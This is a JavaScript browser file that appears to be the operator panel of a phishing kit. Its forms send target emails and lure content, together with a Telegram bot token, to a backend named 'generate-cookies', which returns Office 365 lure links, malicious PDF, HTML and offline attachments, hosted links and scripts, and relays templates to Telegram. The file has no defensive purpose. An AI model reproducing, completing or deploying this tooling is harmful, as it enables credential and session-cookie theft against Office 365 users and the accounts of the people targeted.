// Function to handle POST requests to API
async function postData(url = '', data = {}) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok.');
        }

        return await response.json();
    } catch (error) {
        console.error('Error:', error);
        throw error; // Rethrow the error for handling in specific functions
    }
}

// Handle form submissions when DOM content is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Fetch the Telegram bot token and chat ID from environment variables
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Handle generating Office 365 link
    const linkForm = document.getElementById('linkForm');
    if (linkForm) {
        linkForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const email = document.getElementById('email').value;
            const linkResultDiv = document.getElementById('linkResult');
            linkResultDiv.innerHTML = 'Generating link...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateOffice365Link', { email, chatId, token: telegramBotToken });
                linkResultDiv.innerHTML = `Generated Link: <a href="${result.link}" target="_blank">${result.link}</a>`;
                console.log('Link generated successfully:', result);
            } catch (error) {
                linkResultDiv.innerHTML = `Error generating link: ${error.message}`;
                console.error('Error generating link:', error);
            }
        });
    }

    // Handle generating PDF attachment
    const attachmentForm = document.getElementById('attachmentForm');
    if (attachmentForm) {
        attachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const content = document.getElementById('content').value;
            const attachmentResultDiv = document.getElementById('attachmentResult');
            attachmentResultDiv.innerHTML = 'Generating PDF attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'pdf', content, chatId, token: telegramBotToken });
                attachmentResultDiv.innerHTML = `Generated PDF: <a href="${result.attachmentUrl}" target="_blank">Download PDF</a>`;
                console.log('PDF attachment generated successfully:', result);
            } catch (error) {
                attachmentResultDiv.innerHTML = `Error generating PDF: ${error.message}`;
                console.error('Error generating PDF:', error);
            }
        });
    }

    // Handle generating ready offline attachment
    const offlineAttachmentForm = document.getElementById('offlineAttachmentForm');
    if (offlineAttachmentForm) {
        offlineAttachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const offlineContent = document.getElementById('offlineContent').value;
            const offlineAttachmentResultDiv = document.getElementById('offlineAttachmentResult');
            offlineAttachmentResultDiv.innerHTML = 'Generating ready offline attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'offline', content: offlineContent, chatId, token: telegramBotToken });
                offlineAttachmentResultDiv.innerHTML = `Generated Offline Attachment: <a href="${result.attachmentUrl}" target="_blank">Download Attachment</a>`;
                console.log('Offline attachment generated successfully:', result);
            } catch (error) {
                offlineAttachmentResultDiv.innerHTML = `Error generating offline attachment: ${error.message}`;
                console.error('Error generating offline attachment:', error);
            }
        });
    }

    // Handle generating scripts code JS and HTML
    const scriptsForm = document.getElementById('scriptsForm');
    if (scriptsForm) {
        scriptsForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const scriptContent = document.getElementById('scriptContent').value;
            const scriptsResultDiv = document.getElementById('scriptsResult');
            scriptsResultDiv.innerHTML = 'Generating scripts...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'scripts', content: scriptContent, chatId, token: telegramBotToken });
                scriptsResultDiv.innerHTML = `Generated Scripts: <a href="${result.attachmentUrl}" target="_blank">Download Scripts</a>`;
                console.log('Scripts generated successfully:', result);
            } catch (error) {
                scriptsResultDiv.innerHTML = `Error generating scripts: ${error.message}`;
                console.error('Error generating scripts:', error);
            }
        });
    }

    // Handle generating direct hosted link
    const directLinkForm = document.getElementById('directLinkForm');
    if (directLinkForm) {
        directLinkForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const hostedLinkContent = document.getElementById('hostedLinkContent').value;
            const directLinkResultDiv = document.getElementById('directLinkResult');
            directLinkResultDiv.innerHTML = 'Generating hosted link...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateHostedLink', { content: hostedLinkContent, chatId, token: telegramBotToken });
                directLinkResultDiv.innerHTML = `Generated Hosted Link: <a href="${result.hostedLink}" target="_blank">${result.hostedLink}</a>`;
                console.log('Hosted link generated successfully:', result);
            } catch (error) {
                directLinkResultDiv.innerHTML = `Error generating hosted link: ${error.message}`;
                console.error('Error generating hosted link:', error);
            }
        });
    }

    // Handle template selection
    const templateSelect = document.getElementById('templateSelect');
    if (templateSelect) {
        templateSelect.addEventListener('change', async function(event) {
            const selectedTemplate = event.target.value;
            const templateResultDiv = document.getElementById('templateResult');
            templateResultDiv.innerHTML = 'Sending selected template to Telegram...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/sendTemplate', { template: selectedTemplate, chatId, token: telegramBotToken });
                templateResultDiv.innerHTML = `Selected Template Sent: ${result.message}`;
                console.log('Template sent successfully:', result);
            } catch (error) {
                templateResultDiv.innerHTML = `Error sending template: ${error.message}`;
                console.error('Error sending template:', error);
            }
        });
    }

    // Handle generating HTML attachment
    const htmlAttachmentForm = document.getElementById('htmlAttachmentForm');
    if (htmlAttachmentForm) {
        htmlAttachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const htmlContent = document.getElementById('htmlContent').value;
            const htmlAttachmentResultDiv = document.getElementById('htmlAttachmentResult');
            htmlAttachmentResultDiv.innerHTML = 'Generating HTML attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'html', content: htmlContent, chatId, token: telegramBotToken });
                htmlAttachmentResultDiv.innerHTML = `Generated HTML: <a href="${result.attachmentUrl}" target="_blank">Download HTML</a>`;
                console.log('HTML attachment generated successfully:', result);
            } catch (error) {
                htmlAttachmentResultDiv.innerHTML = `Error generating HTML: ${error.message}`;
                console.error('Error generating HTML:', error);
            }
        });
    }
});
